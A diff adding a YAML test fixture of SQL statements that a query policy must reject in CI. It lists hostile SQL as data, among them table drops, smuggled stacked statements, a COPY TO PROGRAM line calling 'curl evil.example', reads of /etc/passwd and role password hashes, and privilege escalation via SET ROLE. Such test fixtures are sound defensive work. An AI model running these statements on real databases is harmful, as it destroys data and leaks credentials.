@@ -1,0 +1,36 @@
+# Every entry MUST be rejected by the SQL policy (critical security regression gate in CI).
+attacks:
+  - {id: drop_table, sql: "DROP TABLE marts.fact_transactions"}
+  - {id: delete_rows, sql: "DELETE FROM marts.fact_transactions"}
+  - {id: update_rows, sql: "UPDATE marts.fact_transactions SET amount = 0"}
+  - {id: insert_rows, sql: "INSERT INTO marts.dim_channel VALUES ('x','y')"}
+  - {id: stacked_statements, sql: "SELECT 1 FROM marts.dim_channel; DROP TABLE marts.dim_channel"}
+  - {id: select_into, sql: "SELECT * INTO newtab FROM marts.dim_channel"}
+  - {id: create_table_as, sql: "CREATE TABLE x AS SELECT * FROM marts.dim_channel"}
+  - {id: copy_program, sql: "COPY (SELECT 1) TO PROGRAM 'curl evil.example'"}
+  - {id: raw_core_table, sql: "SELECT * FROM core.transactions"}
+  - {id: raw_eval_labels, sql: "SELECT * FROM eval.fraud_labels"}
+  - {id: customer_names_via_core, sql: "SELECT full_name FROM core.customers"}
+  - {id: staging_schema, sql: "SELECT * FROM stg.stg_customers"}
+  - {id: pg_catalog_roles, sql: "SELECT rolname, rolpassword FROM pg_catalog.pg_authid"}
+  - {id: pg_shadow_unqualified, sql: "SELECT * FROM pg_shadow"}
+  - {id: information_schema, sql: "SELECT table_name FROM information_schema.tables"}
+  - {id: pg_sleep, sql: "SELECT pg_sleep(30) FROM marts.dim_channel"}
+  - {id: pg_read_file, sql: "SELECT pg_read_file('/etc/passwd') FROM marts.dim_channel"}
+  - {id: set_config, sql: "SELECT set_config('statement_timeout','0',false) FROM marts.dim_channel"}
+  - {id: current_setting, sql: "SELECT current_setting('server_version') FROM marts.dim_channel"}
+  - {id: version_fn, sql: "SELECT version() FROM marts.dim_channel"}
+  - {id: dblink, sql: "SELECT * FROM dblink('host=evil','select 1') AS t(a int)"}
+  - {id: generate_series_dos, sql: "SELECT * FROM generate_series(1, 100000000000)"}
+  - {id: nested_core_subquery, sql: "SELECT * FROM marts.dim_channel WHERE channel IN (SELECT transaction_id FROM core.transactions)"}
+  - {id: cte_hides_core, sql: "WITH x AS (SELECT * FROM core.transactions) SELECT * FROM x"}
+  - {id: lateral_function, sql: "SELECT * FROM marts.dim_channel c, LATERAL pg_ls_dir('/') AS d"}
+  - {id: recursive_cte, sql: "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT n FROM r, marts.dim_channel"}
+  - {id: for_update, sql: "SELECT * FROM marts.dim_channel FOR UPDATE"}
+  - {id: unknown_column_secret, sql: "SELECT full_name FROM marts.dim_customer"}
+  - {id: cross_database, sql: "SELECT * FROM otherdb.marts.dim_channel"}
+  - {id: set_role, sql: "SET ROLE postgres"}
+  - {id: transaction_control, sql: "BEGIN"}
+  - {id: comment_smuggled_drop, sql: "SELECT 1 FROM marts.dim_channel /* ; */; DROP TABLE marts.dim_channel"}
+  - {id: lo_import, sql: "SELECT lo_import('/etc/passwd') FROM marts.dim_channel"}
+  - {id: query_to_xml, sql: "SELECT query_to_xml('select * from core.customers', true, true, '') FROM marts.dim_channel"}
